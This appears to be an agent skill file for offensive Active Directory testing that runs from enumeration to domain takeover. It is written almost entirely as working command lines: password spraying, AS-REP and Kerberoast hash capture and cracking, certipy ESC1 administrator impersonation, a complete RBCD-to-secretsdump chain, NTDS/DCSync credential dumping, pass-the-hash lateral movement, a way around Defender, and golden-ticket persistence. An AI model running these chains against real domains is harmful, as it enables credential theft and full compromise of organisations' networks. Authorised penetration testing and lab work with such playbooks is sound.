---
name: hunt-ad
description: Active Directory attack hunting - enumeration to domain dominance. Spray-safe (lockout gate), AS-REP/Kerberoast, ACL + ADCS (ESC1-16), delegation, DCSync, lateral movement. Wiki-first, FIND schema output.
---

# Hunt: Active Directory

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "<technique: kerberoasting | ADCS ESC | RBCD delegation | DCSync | dacl abuse>" via wiki-search MCP -> read matching page.
```
Core pages: [[ad-enumeration]], [[kerberos-attacks]], [[adcs]], [[ad-lateral-movement]], [[pass-the-hash]], [[ad-persistence]]. Cheatsheet: [[ad-cheatsheet]].

**Self-heal:** wiki query empty -> create stub `wiki/techniques/active-directory/<slug>.md` (frontmatter + `## Observed during <engagement>`) before proceeding, so the gap fills.

## Scope + Safety Gate (READ FIRST)
- Confirm DC / domain in scope. Read `Deadends.md` + `loot.md` - **reuse captured creds first** before researching new ones (see [[default-credentials]]).
- **Lockout gate before ANY spray:** read the policy - `nxc smb <dc> -u <user> -p <pass> --pass-pol`. RoE `no_bruteforce` / `passive_only` -> enumerate only, NO spray. Never exceed `(threshold - 1)` attempts per account per window.
- **Clock skew:** sync to DC (`ntpdate <dc>` or `faketime`) or Kerberos TGT requests fail with `KRB_AP_ERR_SKEW`.
- Never pivot through `192.168.1.x` hosts (Ligolo tunnel only for lateral movement).

## Attack Surface Signals
Ports: SMB 445, LDAP 389/636, Kerberos 88, ADWS 9389, WinRM 5985/5986, RPC 135, MSSQL 1433, ADCS web enroll 80/443 (`/certsrv`).
Footholds: null/guest SMB, anonymous LDAP bind, AS-REP-roastable users (no preauth), SMB signing OFF (relay), `ms-DS-MachineAccountQuota > 0`, pre-Win2000 computers, LAPS readable.

## Methodology
1. **Unauth enum:**
```bash
nxc smb <dc> -u '' -p '' --shares            # null session
nxc ldap <dc> -u '' -p '' --users            # anonymous bind
enum4linux-ng -A <dc>;  rpcclient -U '' -N <dc>
```
2. **Build the user list - harvest EXHAUSTIVELY, then validate (lockout-safe):**
   When anon enum is locked down, the user list comes from the target's own web app + OSINT. **Scrape
   EVERY page, not just the homepage** - names hide in `about`/`team`/`staff`/`leadership`/`testimonial`/
   `contact` sections that the index page does not show. (Missing the `about.html` "Our Team" block once
   cost two valid users on a box.) Extract every `First Last`, note the format from any leaked email
   (`j.doe@dom` = `f.last`), generate permutations, and let kerbrute tell you which are real:
```bash
# pull all pages, strip tags, extract capitalized name bigrams
for p in $(curl -s http://<t>/ | grep -oiE 'href="[^"]+\.html?"' | cut -d'"' -f2 | sort -u); do
  curl -s http://<t>/$p | sed -e 's/<[^>]*>/ /g'; done | grep -oE '[A-Z][a-z]+ [A-Z][a-z]+' | sort -u
# -> for each "First Last": emit f.last, flast, first.last, first_last, last  (+ leaked-email format)
kerbrute userenum -d <domain> --dc <dc> users.txt      # filler template names simply will NOT validate
nxc smb <dc> -u users.txt -p 'Season2025!' --continue-on-success   # then one-pass spray, lockout-gated
```
   Every validated user is an AS-REP roast + spray target (step 3). Do NOT stop at the first/only name
   the homepage leaks.
3. **Roasting:**
```bash
impacket-GetNPUsers <domain>/ -dc-ip <dc> -usersfile users.txt -no-pass   # AS-REP
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request          # Kerberoast
hashcat -m 18200 asrep.txt rockyou.txt;  hashcat -m 13100 tgs.txt rockyou.txt
```
4. **BloodHound + ACL abuse:**
```bash
nxc ldap <dc> -u <user> -p <pass> --bloodhound -c all --dns-server <dc>
# GenericWrite/WriteDACL/GenericAll -> shadow creds (certipy shadow auto), targeted Kerberoast, group add
```
5. **ADCS (run on every engagement):**
```bash
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout    # ESC1-16
certipy req -u <user>@<domain> -p <pass> -ca <ca> -template <vuln> -upn administrator@<domain>   # ESC1
```
6. **Delegation:** unconstrained (TGT capture via printerbug/coerce), constrained (`-impersonate`), RBCD (`ms-DS-AllowedToActOnBehalfOfOtherIdentity` write).
   - **RBCD -> DA chain** (own an account with `AddAllowedToAct`/`GenericWrite` on a computer + MAQ>0): `impacket-addcomputer <dom>/<u>:<p> -computer-name 'FAKE$' -computer-pass <pw> -dc-ip <dc>` -> `impacket-rbcd <dom>/<u>:<p> -delegate-to 'DC01$' -delegate-from 'FAKE$' -action write -dc-ip <dc>` -> `impacket-getST <dom>/'FAKE$':<pw> -spn cifs/DC01.<dom> -impersonate Administrator -dc-ip <dc>` -> `KRB5CCNAME=<ccache> impacket-secretsdump -k -no-pass DC01.<dom> -just-dc-user Administrator`. Sync clock if getST throws `KRB_AP_ERR_SKEW`. The account with the write is often obtained by **password reuse from an on-box cred store** (step 7), not an ACL edge from your foothold.
7. **Credential access / DCSync:**
```bash
nxc smb <dc> -u <user> -p <pass> --ntds                 # if admin
impacket-secretsdump <domain>/<user>:<pass>@<dc>        # DCSync if rights
```
   - **On-box cred stores (via RDP/session):** a user only in **Remote Desktop Users** can still RDP the DC (nxc rdp shows Pwn3d) -> hunt KeePass `*.kdbx`, browser/WinSCP/RDP creds. A KeePass DB keyed to the **Windows user account** (`KeePass.config.xml` `<UserAccount>true</UserAccount>`) is UNCRACKABLE offline - open KeePass ON the box as that user, then spray the creds for reuse. Headless-RDP recipe: [[ad-lateral-movement]] / Skill(ctf-box); see [[password-cracking]].
8. **Lateral:** PtH / PtT / overpass-the-hash -> `evil-winrm`, `nxc ... -x`, `impacket-wmiexec`, `psexec`. **AV gotcha:** Defender blocks `nxc -x`/wmiexec output retrieval ("could not retrieve output file"); to just READ a file (the flag) as admin, skip exec entirely: `smbclient //<dc>/C$ -U <dom>/Administrator --pw-nt-hash <nt> -c 'get Users\Administrator\Desktop\flag.txt'`, or use `--exec-method smbexec/atexec`.
9. **Dominance:** golden (krbtgt) / silver / diamond ticket, DCSync persistence, AdminSDHolder, certificate (ESC8 NTLM relay to ADCS web enroll).
10. **Distill to wiki (when confirmed):** if the finding is a reusable ACL chain, ADCS ESC variant, or relay primitive, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/active-directory/adcs.md` (or `--kind default-cred`). Promote later via `scripts/wiki-promote.py`.

## FIND Output
Confirmed:
```
Create Vulns/Research/FIND-XXX-<SEV>-<issue>-<host>.md   (e.g. FIND-012-CRITICAL-adcs-esc1-dc01.md)
Add row to Vuln-index.md: | FIND-XXX | ESC1 cert -> DA | dc01 | CONFIRMED |
```
Severity: CRITICAL = DA / domain compromise / DCSync / ESC1 / ESC8; HIGH = user creds + lateral, Kerberoast cracked to priv account; MEDIUM = enum/info disclosure, spray hit with no privilege.

Exhausted (full user x pass matrix once, no hit; ADCS no vuln template; BloodHound no path):
```
Append to Deadends.md: - [ ] AD spray <domain> -- full matrix Season2025!/Welcome1, 0 hits (lockout thr 5); ADCS no ESC; no BH path from <user>
```

Report: Status + files created.
